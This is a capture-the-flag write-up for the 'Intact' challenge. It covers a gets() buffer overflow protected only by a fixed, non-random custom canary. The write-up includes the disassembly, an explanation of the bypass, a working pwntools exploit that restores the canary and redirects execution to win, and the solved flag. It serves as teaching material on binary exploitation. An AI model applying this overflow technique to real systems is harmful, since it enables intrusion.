# Intact

## Challenge

We're given an application which asks for a password and reads input with `gets`.

The program was compiled with the canary disabled, but there is a custom canary included in the source code.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

Let's look at the disassembly for the `verifyPassword` function:

```asm
┌ 164: sym.verifyPassword ();
│           ; var char *s2 @ rbp-0x1b
│           ; var char *var_13h @ rbp-0x13
│           ; var int64_t var_fh @ rbp-0xf
│           ; var int64_t var_dh @ rbp-0xd
│           ; var char *s1 @ rbp-0xc
│           ; var int64_t var_4h @ rbp-0x4
│           0x004012e6      55             push rbp
│           0x004012e7      4889e5         mov rbp, rsp
│           0x004012ea      4883ec20       sub rsp, 0x20
│           0x004012ee      c745ed63616e.  mov dword [var_13h], 0x616e6163 ; 'cana'
│           0x004012f5      66c745f17279   mov word [var_fh], 0x7972   ; 'ry'
│           0x004012fb      c645f300       mov byte [var_dh], 0
│           0x004012ff      488d45f4       lea rax, [s1]
│           0x00401303      be08000000     mov esi, 8                  ; int64_t arg2
│           0x00401308      4889c7         mov rdi, rax                ; int64_t arg1
│           0x0040130b      e8f8feffff     call sym.rand_string
│           0x00401310      488d050e0d00.  lea rax, str.Please_enter_your_password:_n ; 0x402025 ; "Please enter your password:\n"
│           0x00401317      4889c7         mov rdi, rax                ; const char *s
│           0x0040131a      e821fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040131f      488d45e5       lea rax, [s2]
│           0x00401323      4889c7         mov rdi, rax                ; char *s
│           0x00401326      b800000000     mov eax, 0
│           0x0040132b      e830fdffff     call sym.imp.gets           ; char *gets(char *s)
│           0x00401330      488d4de5       lea rcx, [s2]
│           0x00401334      488d45f4       lea rax, [s1]
│           0x00401338      ba08000000     mov edx, 8                  ; size_t n
│           0x0040133d      4889ce         mov rsi, rcx                ; const char *s2
│           0x00401340      4889c7         mov rdi, rax                ; const char *s1
│           0x00401343      e8e8fcffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)
│           0x00401348      8945fc         mov dword [var_4h], eax
│           0x0040134b      488d45ed       lea rax, [var_13h]
│           0x0040134f      ba07000000     mov edx, 7                  ; size_t n
│           0x00401354      488d0d0d2d00.  lea rcx, obj.stored_canary  ; 0x404068 ; "canary"
│           0x0040135b      4889ce         mov rsi, rcx                ; const char *s2
│           0x0040135e      4889c7         mov rdi, rax                ; const char *s1
│           0x00401361      e8cafcffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)
│           0x00401366      85c0           test eax, eax
│       ┌─< 0x00401368      7419           je 0x401383
│       │   0x0040136a      488d05d70c00.  lea rax, str.Stack_smashing_detected._Aborting._n ; 0x402048 ; "Stack smashing detected. Aborting.\n"
│       │   0x00401371      4889c7         mov rdi, rax                ; const char *s
│       │   0x00401374      e8c7fcffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x00401379      bf01000000     mov edi, 1
│       │   0x0040137e      e80dfdffff     call sym.imp.exit
│       │   ; CODE XREF from sym.verifyPassword @ 0x401368
│       └─> 0x00401383      b801000000     mov eax, 1
│           0x00401388      c9             leave
└           0x00401389      c3             ret
```

At the start, the function stores the string `"canary"` at `var_13h`.
At the end of the function, it compares the contents of the string at `var_13h` to the string `"canary"`.
If this test fails, the program exits without returning.

This functions as a custom stack canary, similar to the one built into GCC.
However, the canary is not randomized.
This makes it trivial to avoid overwriting the canary by including it in our payload.

Adding the canary into our payload such that the canary doesn't change before and after the buffer overflow, we can pass this check.
We can then return to the `win` function as normal.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host srv3.momandpopsflags.ca --port 2007 intact
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('intact')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'srv3.momandpopsflags.ca'
port = int(args.PORT or 2007)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

payload = flat({
    0x1b-0x13: b"canary\0",
    0x1b+0x8: exe.sym['win'],
    })
io.sendlineafter(b"Please enter your password:\n", payload)

io.interactive()
```

## Flag

```
magpie{&&_th3_c4n@r1_dld_n()7_s!ng}
```
